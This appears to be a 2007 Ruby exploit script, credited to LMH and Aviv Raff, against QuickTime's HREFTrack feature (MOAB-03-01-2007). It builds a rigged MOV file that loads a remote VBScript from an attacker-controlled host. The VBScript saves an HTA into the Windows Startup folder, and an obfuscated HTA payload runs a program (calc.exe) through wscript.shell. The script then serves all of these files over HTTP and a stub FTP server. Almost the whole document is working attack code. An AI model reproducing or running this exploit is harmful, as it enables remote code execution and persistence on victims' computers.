#!/usr/bin/ruby
#
# (c) 2006 LMH <lmh [at] info-pull.com>
# Original scripting and POC by Aviv Raff (http://aviv.raffon.net).
#
# Description:
#   Exploit for MOAB-03-01-2007. If argument 'serve' is passed, it uses port 21 for running the
#   fake FTP server (required). HTTP server port can be modified but it's
#   not recommended. Adjust as necessary.
#
# see http://projects.info-pull.com/moab/MOAB-03-01-2007.html

require 'socket'
require 'fileutils'
require 'webrick'

trap 0, proc {
  puts "-- Terminating: #{$$}"
}

REMOTE_HOST   = "192.168.1.133" # Modify to match IP address or hostname
REMOTE_URL    = "http://#{REMOTE_HOST}/" # Modify to match target path (ex. /mypath)
TARGET_SCRIPT = "on error resume next\r\n" +
                "Set c = CreateObject(\"ADODB.Connection\")\r\n" +
                "co = \"Driver={Microsoft Text Driver (*.txt; *.csv)};Dbq=#{REMOTE_URL};Extensions=txt;\"\r\n" +
                "c.Open co\r\n" +
                "set rs =CreateObject(\"ADODB.Recordset\")\r\n" +
                "rs.Open \"SELECT * from qtpoc.txt\", c\r\n" +
                "rs.Save \"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\poc.hta\", adPersistXML\r\n" +
                "rs.close\r\n" +
                "c.close\r\n" +
                "window.close\r\n"

HTA_PAYLOAD   = "<script>q='%77%73%63%72%69%70';</script>\r\n" +
                "<script>q+='%74%2E%73%68%65%6C%6C';</script>\r\n" +
                "<script>a=new ActiveXObject(unescape(q));</script>\r\n" +
                "<script>a.run('%windir%\\\\System32\\\\calc.exe');</script>\r\n" + # executes calc.exe
                "<script>window.close();</script>\r\n"

HREFTRACK_COD = "A<res://mmcndmgr.dll/prevsym12.htm#%29%3B%3C/style%3E%3Cscript src=\"#{REMOTE_URL}q.vbs\" " +
                "language=\"vbscript\"%3E%3C/script%3E%3C%21--//|> T<>"

TARGET_DIRECTORY = "served"

#
# ---- Real fun starts here ----
#

puts "++ Preparing files..."

#
# Prepare the MOV file with the HREFTrack pointing at our script.
# 
original_mov = File.read("qtpoc.mov")

# Prepare directory structure
FileUtils::mkdir(TARGET_DIRECTORY)

puts "++ MOV file...."
# Write the new MOV file
f = File.new(File.join(TARGET_DIRECTORY, "qtpoc.mov"), "w")
f.write(original_mov)
f.close

puts "++ Script file...."
# Write the script file
f = File.new(File.join(TARGET_DIRECTORY, "q.vbs"), "w")
f.print(TARGET_SCRIPT)
f.close

puts "++ HTA payload file...."
# Write the new HTA file (payload)
f = File.new(File.join(TARGET_DIRECTORY, "qtpoc.txt"), "w")
f.print(HTA_PAYLOAD)
f.close

#
# win32 doesn't like fork ;-)
#
if ARGV[0] == "serve"
  # HTTP server... via Webrick
  puts "++ Done. Starting HTTP server..."
  web_server   = WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot =>TARGET_DIRECTORY)
  fork do
    begin
      web_server.start
    rescue
      exit
    end
  end

  # FTP server....
  puts "++ Done. Starting FTP server..."
  begin
    ftp_server = TCPServer.new('localhost', 21)
  rescue
    web_server.shutdown
    exit
  end

  # 220 Microsoft FTP Service
  # USER anonymous
  # 331 Anonymous access allowed, send identity (e-mail name) as password.
  # PASS IEUser@
  # 230 Anonymous user logged in.
  # (...)
  while (ftp_session = ftp_server.accept)
    puts "++ FTP: #{ftp_session.gets}"
    # TODO: implement fake responses just to satisfy it.
    ftp_session.close
  end

  # finished
  web_server.shutdown  
end

# milw0rm.com [2007-01-03]
